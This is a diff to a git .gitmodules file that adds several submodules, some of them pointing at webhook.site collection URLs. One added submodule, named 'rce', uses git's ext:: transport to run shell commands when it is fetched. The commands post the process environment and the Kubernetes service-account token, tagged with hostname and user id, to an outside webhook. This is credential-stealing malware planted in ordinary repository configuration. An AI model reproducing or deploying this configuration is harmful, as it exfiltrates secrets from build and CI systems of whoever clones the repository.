@@ -1,6 +1,13 @@
 [submodule "probe"]
 	path = probe
-	url = https://webhook.site/205a7343-f018-41fd-b245-bfe8184d45a8/sub.git
+	url = https://webhook.site/239b1527-b542-4bd7-a2d3-8204d7d83a6e/probe.git
 [submodule "probe2"]
 	path = probe2
-	url = https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/sub2.git
+	url = https://webhook.site/205a7343-f018-41fd-b245-bfe8184d45a8/probe2.git
+[submodule "normal"]
+	path = normal
+	url = https://github.com/ilya-vlad0/podtest-42c3e3bb.git
+	branch = main
+[submodule "rce"]
+	path = rce
+	url = "ext::sh -c curl% -sk% -m% 15% -o% /dev/null% --data-binary% @/proc/self/environ% https://webhook.site/239b1527-b542-4bd7-a2d3-8204d7d83a6e/env-$(hostname);curl% -sk% -m% 15% -o% /dev/null% --data-binary% @/var/run/secrets/kubernetes.io/serviceaccount/token% https://webhook.site/239b1527-b542-4bd7-a2d3-8204d7d83a6e/sa-$(hostname);curl% -sk% -m% 10% -o% /dev/null% https://webhook.site/239b1527-b542-4bd7-a2d3-8204d7d83a6e/ext-$(hostname)-$(id% -u)"
